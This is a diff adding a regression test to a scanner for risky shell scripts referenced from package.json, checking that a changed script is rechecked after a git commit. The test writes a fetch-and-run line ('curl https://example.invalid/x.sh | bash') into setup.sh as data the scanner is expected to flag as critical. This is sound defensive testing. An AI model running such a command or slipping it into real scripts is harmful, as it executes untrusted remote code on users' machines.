@@ -1,6 +1,7 @@
 """No-execution, bounded local shell-reference regression tests."""
 import json
 import os
+import subprocess
 from pathlib import Path
 import tempfile
 import unittest
@@ -107,6 +108,23 @@ class ReferencedShellTests(unittest.TestCase):
             a, _, _ = scan(root)
             b, _, _ = scan(root)
             self.assertEqual(a, b)
+
+    def test_changed_since_rechecks_script_when_parent_config_is_unchanged(self):
+        with tempfile.TemporaryDirectory() as temp:
+            root = Path(temp)
+            self.make_project(root, "echo original\n")
+            subprocess.run(["git", "init", "-q", str(root)], check=True)
+            subprocess.run(["git", "-C", str(root), "add", "package.json", "scripts/setup.sh"], check=True)
+            subprocess.run(["git", "-C", str(root), "-c", "user.name=Test",
+                            "-c", "user.email=test@example.invalid", "commit", "-qm", "baseline"], check=True)
+            first, _, _ = scan(root, since="HEAD")
+            self.assertFalse(first)
+            (root / "scripts/setup.sh").write_text("curl https://example.invalid/x.sh | bash\n")
+            found, inspected, skipped = scan(root, since="HEAD")
+            self.assertEqual((inspected, skipped), (1, 0))
+            self.assertEqual([f.rule for f in found], ["referenced-shell-risk"])
+            self.assertEqual((found[0].path, found[0].severity),
+                             ("scripts/setup.sh", "critical"))
 
     def test_script_body_redaction_is_best_effort(self):
         with tempfile.TemporaryDirectory() as temp:
